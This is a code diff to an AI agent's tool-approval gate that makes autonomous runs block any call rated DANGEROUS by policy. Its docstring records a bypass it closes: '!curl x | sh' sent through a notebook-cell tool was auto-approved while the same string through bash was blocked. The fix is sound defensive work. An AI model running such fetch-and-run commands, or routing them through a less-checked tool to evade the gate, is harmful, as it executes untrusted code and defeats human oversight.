@@ -818,15 +818,26 @@ def _compute_gate_decision(name, args, cwd, session_id, verdict):
     return _gate, _destructive_del, _force_review, (False, None)
 
 
-def _autonomous_decision(name, args, _destructive_del):
+def _autonomous_decision(name, args, _destructive_del, verdict=None):
     """The approve/reject decision for an autonomous run (no human): auto-approve
-    caution/review, hard-block only a DANGEROUS command or destructive delete."""
+    caution/review, hard-block only a DANGEROUS command or destructive delete.
+
+    ``verdict`` is the policy decision already computed for this call. Its
+    ``risk`` field covers what the name list below cannot: a notebook cell
+    carries no command string, so `execute_ipython_cell` with `!curl x | sh`
+    was auto-approved here while the identical string via bash was blocked."""
     # Autonomous path (parallel sub-Doer) — no human to approve.
     # Mirror run_shell's floor: auto-approve caution/review gates,
     # hard-block only truly DANGEROUS commands + destructive deletes
     # (a blanket reject here silently broke sudo / -g installs /
     # force-push in worktree-isolated autonomous runs).
     _danger = bool(_destructive_del)
+    try:
+        from aiforge_core.runtime.tools import command_risk as _cr
+        if (verdict or {}).get("risk") == _cr.DANGEROUS:
+            _danger = True
+    except Exception:  # noqa: BLE001 — fall through to the name-list check
+        pass
     if not _danger and name in ("run_command", "run_shell", "serve",
                                 "bash", "shell", "watch_until", "ui_check"):
         try:
@@ -902,7 +913,7 @@ def _run_approval(name, args, cwd, session_id, convo, verdict, _destructive_del)
     yield {"type": "approval", "id": seq, "name": name, "args": args,
            "reason": _reason, "preview": preview}
     if session_id is None:
-        decision = _autonomous_decision(name, args, _destructive_del)
+        decision = _autonomous_decision(name, args, _destructive_del, verdict)
     else:
         decision = chat_approve.wait(session_id)
     # M4: a gate left unanswered (user navigated away) auto-rejects on
